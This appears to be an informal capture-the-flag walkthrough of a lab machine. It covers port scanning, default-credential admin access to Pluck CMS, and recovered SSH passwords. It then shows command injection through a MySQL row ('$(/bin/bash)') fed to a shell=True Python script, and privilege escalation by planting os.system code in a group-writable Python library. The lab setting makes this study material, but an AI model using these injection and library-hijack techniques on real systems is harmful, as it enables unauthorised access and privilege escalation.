first check out open ports 

```bash
nmap 0.0.0.0 -sV -Pn -sC
```

there is open port 80, some page

`http://10.201.48.24/app/pluck-4.7.13/admin.php?action=page`

after digging find admin panel with default credentaials a `password` used and login web panel there i can upload a file `.phar` format revershell or cmd console

seaching for clue `opt` was a key inside file find password

username: `lucien`
password: `HeyLucien#@1999!`

let's connect with ssh

```bash
ssh lucien@0.0.0.0
```

seems  only death user can run command `sudo -l`
there is was a flag to get second inside the code `/opt/getDreams.py` i found vulnurbilty to run command and `.bash_history` current user has credentails for mysql database

vulnrabile code 

```python
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
```

 let's get into mysql 

```bash
mysql -u lucien -plucien42DBPASSWORD
```

mysql i found library database

```mysql
use library
```

and adding some value there could added reverse shell or command i chosed command

```mysql
insert into dreams values ("elster", "$(/bin/bash)")
```

it help to get shell of death, exit after inserting a value

```
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

get credentails `cat /home/death/getDreams.py` and exit you will output look for password

username: `death`
password: `!mementoMORI666!`

```bash
ssh death@0.0.0.0
```

find the flag

let's do privilge escalation 
i check a file in morpheus and there is a file some text and script script does backup which mean we could use to privileg escalation i need find library to changle file privileg to access 

```bash
find / -group death -type f 2>/dev/null | grep shutil
```

after find a file i need insert this code somewhere that should execute this code

```python
os.system("chmod 777 /home/morpheus/morpheus_flag.txt")
```

than cat this file

```bash
cat /home/morepheus/morpheus_flag.txt
```

I got the flag